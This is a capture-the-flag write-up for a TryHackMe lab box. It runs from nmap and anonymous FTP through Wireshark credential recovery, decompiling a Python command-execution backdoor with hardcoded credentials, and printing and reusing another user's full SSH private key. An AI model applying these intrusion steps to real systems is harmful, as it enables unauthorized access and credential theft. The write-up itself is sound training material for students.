# Rmse uchiha Ctf - Tyrhackme writeup









First of all 

## Some organisation

Create a folder where we will put all the content later

```bash
mkdir uchiha_folder
cd uchiha_folder
```
## Scanning the box 


Use `nmap` in order to scan the box :
 
```bash
nmap  -sC -sV <address_ip> -oN nmap_scan.log
```
Seems like the box is up but blocking our ping probes,
so we have to use `-Pn`

```bash
nmap  -sC -sV -Pn <address_ip> -oN nmap_scan.log
```

```
PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
21/tcp open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            69 Nov 05 13:03 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.98.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
```

We can see that there is open ports `20,21,22`.
So ports `20 and 21` are for FTP, port `22` is for SSH. From `nmap`'s result we know that FTP service has anonymous-access enabled!
```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
```
## Explore the FTP service

Connect to the FTP service using this command-line client.

```
ftp <address_ip>
Connected to <address_ip>.
220 (vsFTPd 3.0.3)
Name (<address_ip>:hisoka): anonymous
331 Please specify the password.
Password:
```



For anonymous  there is no password needed, so leave it empty and clic `Enter`

```
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```



We are in, so use `ls` to view the files.

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          7372 Nov 05 19:19 message.txt
226 Directory send OK.
```

Interesting!! we found file named `message.txt`. It can be usefull, need to see it's content.
Get it with command `get`.

```
ftp> get message.txt
local: message.txt remote: message.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for message.txt (7372 bytes).
226 Transfer complete.
7372 bytes received in 0.00 secs (38.0026 MB/s)
ftp> 
```  

When returning to our folder `uchiha_folder`, we find the `message.txt` file. 
Using `cat` or `strings`  commands, 
```
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                ,%&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@%                           #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@.                                  ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@,                                           #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@&                                                   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@#                                                       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@                                                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@                                                             *@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@.                     ,&     %                                  @@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@                  ,@@@@@@     @     ,                            @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@,               (@@@@@@@@@@    (@    ,*                            @@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@             .@@@@@@ @@@@@@#    @@,   @.                            @@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@           ,@@@@@@..&@@#,@@@,   %@@/  (#                             @@@@@@@@@@@@@@@@@@@@@@
@@@@@@@%          @@@@@@.@#.@(@@@@@@@    @@@/  @@                            (@@@@@@@@@@@@@@@@@@@@@
@@@@@@@%          &@@@@#@**&@(@@@@@@@@   *%@&                                 @@@@@@@@@@@@@@@@@@@@@
@@@@@@@*          %@@@(/&@@@/@@@@@@@&&/     ,  .@@@                           %@@@@@@@@@@@@@@@@@@@@
@@@@@@@*          ,@@(@/@,(@@@@@#%*   ,.   /@@@ @@@%                          .@@@@@@@@@@@@@@@@@@@@
@@@@@@@*           .@@@(@@@@@*%   (@@@@   @@&/@@.                              @@@@@@@@@@@@@@@@@@@@
@@@@@@@/           @@@@@@@/%  ,@@@@@@*@@( *@* ( ,@.,@                  %%      %@@@@@@@@@@@@@@@@@@@
@@@@@@@%           @@@@%@  .@@@@@@@@@@@@#  #%@.@@ ,@@%                 @@&     ,@@@@@@@@@@@@@@@@@@@
@@@@@@@%         , %@@@  @@@@@@@@@@@@@@@@* &*%@@@@@@@@                 @@@      @@@@@@@@@@@@@@@@@@@
@@@@@@@@         @ .@  @@@@@@@@@@@@@@@@@@@ (@@@@@@@@@@%                %@@      @@@@@@@@@@@@@@@@@@@
@@@@@@@@         @,  @@@%,  *@@@@@@@@@(*&@% @@@@@@@@@@@                #*@ ...  %@@@@@@@@@@@@@@@@@@
@@@@@@@@         &  % *@@@*/(@@@&@@@@@@@@@@ %*@@@@@@@@@,         %@@@,                  *&@@@@@@@@@
@@@@@@@@.         *. @#@*   %((%*@@@@@@@@@@/%@@@@%(@@@@&         @@@@                         .@@@@
@@@@@@@@,         @@ @ ##%#&@@%@*@@@@@@@@@@@,@@@@@@@@#@@         @@@#                              
@@@@@@@@%         ,@*.@@%.@@@@#@%@@@@@@@@@@@ @@@@@@@@@@@,       ,@@@                               
@@@@@@@@@          %@%@ @@@@@&@@@@@@@@@@@@@@%@@@@@@@@@@@%       %@@@                               
@@@@@@@@@           @@,@@@@@@/@@@@@@@%@@@@@@@@@@@@@@@@@@@       @@@#                               
@@@@@@@@@.          ,@@%@@@@@%@@@/.#@@@@@@@@@@@@@@@@@@@@@       @@@                                
@@@@@@@@@%  #        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/  %   @@@                                
@@@@@@@@@@  # .       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @  ,@@&                                
@@@@@@@@@@.           /@@@@@@@@@@@@@@@@@*@@*(@@@@@@@@@@@@@  @# ,@@,                                
@@@@@@@@(      *       %@@@@@@@@@@@@%@%#@@@@@@@@@@@@@@@@@@. @@ (@@                                 
@@@@@@@                 &@@@@@@@@@@@&@@@@@%,@@@@@@@@@@@@@@,*@@ %@@                                 
@@@@@*          ,        %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@/@@@                                 
@@@@             .        .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@                                 
@@@              ,  .       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@%#@@@                                 
@#                ( %         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@#/&%@@@                                 
@                   #@      .* .@@@@@@@@@@@@@@@@@@@@@@@@%#&/@@(@@@                                 
@                  .,@(     .@/   @@@@@@@@@@@@@@@@@@@%##(@@@@@/@@@                                 
@%                  *@@     .@@#  @@*@@@@@@@@@@@@@,((*@@@@@(@@*@@@                                 
@@(                  @%*    .@@@% &@@@@*@@@@@/./,/@@@@@%(@@@@@*@@@                                 
@@@.                 #@@@   .@@@@%,@@@@@@@/@&%@@@@@@@@@@@@@@@@,@@@                                 
@@@@                  @@@#  .@@@@@%@@@@@@@@*@@@@@@@@@@@@@@@@@@,@@@                                 
@@@@@                  @@@, ,@@@@@@@@@@@@@@@(@@@@@@@@@@@@@@@@(%@@@                                 
@@@@@@                 .@@@.,@@@@@@@@@@@@@@@(@@@@@@@@@@@@@@@(@%@@@                                 
@@@@@@%                 .%@@%@@&%@@@@@&@@&%@&&@@@@@@@@@@@@@%@/#@@@                                 
@@@@@@@(                  @@@&@@@@@%@%@#@&@##*@@@@@@@@@@@@@@**%@@@                                 
@@@@@@@@#                  @%%#@@&@&(&(&@@@%@%@@@@@@@@&/@@.@@@@%@@                                 
@@@@@@@@@,                  @@###&(@#@#@#@*@@@@@@@@@*@@*&@@@@@@%@@                                 
@@@@@@@@@@                   #@#/@/&@(#(@@@@@@@@@@.&@@@@@@@@@%@@                                 
@@@@@@@@@@*                   &%(@@@*%(@@.,%#%,* *@@@@@@@@@@@@/(@@                                 
@@@@@@@@@@@                    (/@//@@@@@@@@@,*@@@@@@@@@@@/    ,@@                                 
@@@@@@@@@@@@                    .@@@@@@@@@@@@@@@@@@@#          .@@                                 
@@@@@@@@@@@@@                     @@@@@@@@@@@#.               *@@#                                 
@@@@@@@@@@@@@@                                               &@@.                                  
@@@@@@@@@@@@@                                           #@@/@@@                                    
@@@@@@@@@@@,                                     ,&,&@@@@**@@@                                     
@@@@@@@@@@@                              .%@#@@.@@@@#@*#@@%                                      
@@@@@@@@@@                            &/@@#@#@@,@@@&*@*@&@@#                                       
@@@@@@@@                               @,@@@@*%@@#(@*@&@@@/                                        
@@@@@@                                 %@%&&/@@,@@*@#%@@@*                                         
@@@&                                    ,@%@@.@@#@*@#@@@/                                          
@@                                     .@%*@%@@,@@#%@@@/                                           
.                                       &@/@(*@@&/&@@@#                                            
                                        @%#@&@(%@@@@@&                                             
                                        @@*@#*@@(&@@@                                              
                                        @@%%@@/@/@@@                                               
                                        .%#@*@ .@@@,                                               
                                        ,  @   @@@%                                                
                                        ,     &@@@                                                 
                                        .    ,@@@                                                  
 

Sadly the admin removed all the files just before uploading this box,

```


we figure out that the file is a message from the admin.
This make as more curiouse to search for hidden things.


Now we have to acctivate `sharingan level 1` to see some hidden files.

Using `ls -a`  we can see all hidden files in the FTP's folder.

```
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 05 19:30 .
drwxr-xr-x    2 ftp      ftp          4096 Nov 05 19:30 ..
-rw-r--r--    1 ftp      ftp         42490 Nov 05 19:29 .sniffing_test.file
-rw-r--r--    1 ftp      ftp          7372 Nov 05 19:29 message.txt
226 Directory send OK.
ftp> 
```

Yeah!! we found a file named `.sniffing_test.file`. Looks like a hidden file created while testing the box.

If we search about `sniffing tools` we find `wireshark`.   

Then here we go to `wireshark` to see the content.

```bash
wireshark .sniffing_test.file
```

We can deduce that was a pinging flood `ICMP` protocol, and other protocols.

 ![img/pcap_file_content.png](img/pcap_file_content.png)



When sorting the list by `protocol`, an `FTP-DATA` port`20` discussion between the server and the client. 

 ![img/ftp_data_protocol.png](img/ftp_data_protocol.png)


By Following the `TCP Stream` of the `FTP-DATA` protocol, we get something that looks like a `auth.log` file.

 ![img/auth_log.png](img/auth_log.png)


This is so interesting, now it's time to acctivate `sharingan level 2` and find usefull informations,
Yeah !!! found credentials `user:password`

```
itachi:<password>
```



## Logging in with SSH credentials

As we saw SSH open port on this box, and `/home/itachi/.ssh` folder was created. So lets go try these credentials!!!

```bash
ssh itachi@<address_ip>
```

Well done !! we are now inside the box. we got a shell command-line:

```bash
itachi@ummto_rmse_lab:~$ 
```

As we learned before the best way to see content of a folder is by using 

```bash
ls -la
```

```bash
itachi@ummto_rmse_lab:~$ ls -la
total 24
drwxr-xr-x 4 itachi itachi 4096 Nov 10 21:36 .
drwxr-xr-x 5 root   root   4096 Nov  8 09:59 ..
drwx------ 2 itachi itachi 4096 Nov 10 21:36 .cache
-rw-r--r-- 1 itachi itachi 2543 Nov  8 09:57 cmd_service.pyc
-rw-r--r-- 1 itachi itachi   51 Nov  8 09:57 flag1.txt
drwxr-xr-x 2 itachi itachi 4096 Nov  8 09:57 .ssh
itachi@ummto_rmse_lab:~$ 
```
We found the first flag, use simply :

```bash
cat flag1.txt
```

flag1

```
THM{UMMTO_RMSE_[*************************]}
```



And also we have `cmd_service.pyc` file. It's a file tha contains `compiled bytecode` of a python `.py`, file.

If we try it

```bash
python3 cmd_service.pyc 
```

we get 

```bash
itachi@ummto_rmse_lab:~$ python3 cmd_service.pyc 
Starting server...
Traceback (most recent call last):
  File "cmd_service.py", line 75, in <module>
  File "cmd_service.py", line 62, in main
  File "/usr/lib/python3.5/socketserver.py", line 440, in __init__
    self.server_bind()
  File "/usr/lib/python3.5/socketserver.py", line 454, in server_bind
    self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
itachi@ummto_rmse_lab:~$ 
```


May be that it's something usefull, let's try incompiling it. We can use `uncompyle6` module, it work's on `python version < 3.8` 

```bash
 uncompyle6 cmd_service.pyc 
```





```python
# uncompyle6 version 3.8.0
# Python bytecode 3.5 (3350)
# Decompiled from: Python 3.5.2 (default, Jan 26 2021, 13:30:48) 
# [GCC 5.4.0 20160609]
# Embedded file name: cmd_service.py
# Compiled at: 2021-10-25 17:45:39
# Size of source mod 2**32: 2128 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(478392448111)
password = long_to_bytes(164244530130083492375522610814074837043181663906865)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username and password_input == password:
            return True
        else:
            return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return
        self.send(b'Succesfully logged in!')
        while True:
            command = self.receive(b'CMD: ')
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt='> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 2971
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.deamon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        print('test1')
        sleep(10)


if __name__ == '__main__':
    main()
# okay decompiling cmd_service.pyc
```



This is an output of the source code of `cmd_service` it looks like reverse engineerin. 
We can see through the code that the service is working on language `port 2971`. After our 'all-port' `nmap` scan, 



also something else captivate our attention,

```
username = long_to_bytes(478392448111)
password = long_to_bytes(164244530130083492375522610814074837043181663906865)
```


Must be credentials, so at this level we have to reverse the function used `long_to_bytes`.
We can reverse the function using this python code 

```python
#!/usr/bin/env python3

from Crypto.Util.number import bytes_to_long, long_to_bytes


username = long_to_bytes(478392448111)
password = long_to_bytes(164244530130083492375522610814074837043181663906865)

username


print(b"username:" + username)
print(b"password:" + password)

```

The result will be:
```
b'username:obito'
b'password:password_ummto_level1'
```


Trying to use "the_result" for SSH login take's us nowere,  !!!!


Maybe we can use "the_result" in the service running on port "2971". We can use `netcat` or `nc` (same thing !)



## Connect to the service

Now we can use the creds to login 

```bash
netcat <address_ip> 2971
```


Results:

```
Username: obito
Password: password_ummto_level1
Succesfully logged in!
#####:
```

If we test `whoami` 

```
#####: whoami
obito
```

Greate !! now let's see the content of "/home" folder, 

```
#####: ls /home
itachi
madara
obito
```

so we have three users 'itachi', 'madara' and 'obito'. get into obito's home folder using `ls /home/obito`

```
#####: ls /home/obito
flag2.txt
message.txt
```

###  Read the flag2.txt

```bash
cat /home/obito/flag2.txt
```

```
THM{UMMTO_RMSE_[*************************]}
```
### Read the message.txt

```bash
cat /home/obito/message.txt
```

```
madara is around, be carefull  !!
```


## Get `obito` SHELL


Because of the limits of the Shell we have 'from the service'. We have to connect as 'obito'. It is good to 'list-all' files of obito's home folder.

```bash
ls -la /home/obito/
```

```
total 28
drwxr-xr-x 4 obito obito 4096 Nov  8 10:04 .
drwxr-xr-x 5 root  root  4096 Nov  8 09:59 ..
-rw------- 1 obito obito  110 Nov  8 10:04 .bash_history
drwx------ 2 obito obito 4096 Nov  8 10:02 .cache
-rw-r----- 1 obito obito   51 Nov  8 09:59 flag2.txt
-rw-r----- 1 obito obito   34 Nov  8 09:59 message.txt
drwxr-xr-x 2 obito obito 4096 Nov  8 09:59 .ssh
```

Interesting `.ssh` folder,

```bash
ls -la /home/obito/.ssh
```



```
total 20
drwxr-xr-x 2 obito obito 4096 Nov  8 09:59 .
drwxr-xr-x 4 obito obito 4096 Nov  8 10:04 ..
-rw-r--r-- 1 obito obito  565 Nov  8 09:59 authorized_keys
-rw------- 1 obito obito 2602 Nov  8 09:59 id_rsa
-rw-r--r-- 1 obito obito  565 Nov  8 09:59 id_rsa.pub
```


Seems that we can connect to `obito` by using 'SSH-KEY' named 'id_rsa'. Let's get the key-file


```bash
cat /home/obito/.ssh/id_rsa
```

key-content:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


Go back to our machine and create a file named `id_rsa`, we can use nano or every text-editor. Then past the key-content into our new file.

Using `nano`

```bash
nano id_rsa
```

As we know 'SSH-keys' must have special privilege to be used, use `chown` to guive the 'key' we created the privileges:

```bash
chown 600 id_rsa
```


## ## Logging in with SSH key


Connect to `obito` user using the 'SSH-key' we created,

```bash
ssh -i id_rsa  obito@10.10.117.80 
```

```
obito@ummto_rmse_lab:~$ 
```


Yeeeeah,!!! we'v made it into `obito` now straight to `madara` folder 
```obito@ummto_rmse_lab:~$ cd /home/madara
```
Then get the content :

```bash
obito@ummto_rmse_lab:/home/madara$ ls -la
```


```
total 12
drwxr-x--- 2 obito obito 4096 Nov  8 09:59 .
drwxr-xr-x 5 root  root  4096 Nov  8 09:59 ..
-rwxr-x--- 1 obito obito   51 Nov  8 09:59  flag3.txt
```

According to the story of The anime, `obito`  pretended to be madara.


But if we use 

```bash
cat flag3.txt
```

```
cat: flag3.txt: No such file or directory
```

###  Read the flag3.txt


From the beginnig to here now we increased our `Visual`, we used mode and more our sens of view.
So now for the last step we have to increase the level of our `visual-prowess`  in order to read the `flag3.txt` file.

We remarque that there is a `space` before  the file, emmm , this is why we couldn't see it's content.

let's use `cat *` to read all the files in the folder we are

```bash
cat *
```

flag3.txt 

```
THM{UMMTO_RMSE_[*************************]}
```


### GOOOD Job !!!, hope this CTF was usefull to increase your skills.


## END

After all i want to thank `Pr.Mehammed DAOUI`  https://scholar.google.fr/citations?user=nTTcT5cAAAAJ&hl=fr for all the support.
Also `John Hammond`  twitter:`@_JohnHammond` for  all the content he publish on youtube where i enjoy watching. And every one who encouraged me during the creation of my first CTF. 




This CTF was created to test the abilities of students, and train them to how a Pentester makes his investigation. 

So just after getting the ability to make it public `Publicly Accessible`, i'll make it `Locked` until all student we wanna test get into.



For more info, advises and suggestions, email me at abdousoft14@gmail.com.

THANK You ;)


